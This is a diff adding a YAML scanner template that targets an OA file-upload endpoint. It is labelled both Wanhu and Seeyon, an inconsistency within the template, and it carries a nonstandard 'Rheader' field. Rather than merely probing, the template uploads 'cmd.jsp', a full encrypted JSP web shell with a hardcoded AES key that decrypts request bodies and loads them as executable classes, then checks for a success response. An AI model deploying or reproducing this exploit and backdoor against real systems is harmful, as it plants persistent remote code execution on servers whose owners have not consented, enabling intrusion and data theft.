@@ -1,0 +1,40 @@
+id: wanhuoa_fileUploadController
+time: '2021-04-08'
+
+
+info:
+  name: Seeyon Unauthoried Access
+  author: pikpikcu
+  severity: high
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/defaultroot/upload/fileUpload.controller"
+    body:
+      - |
+        --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+        Content-Disposition:form-data; name="file"; filename="cmd.jsp"
+        Content-Type:application/octet-stream
+        Content-Transfer-Encoding:binary
+
+        thisispig<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*......tas9er*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+        --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0 & Connection:Keep-Alive
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+    
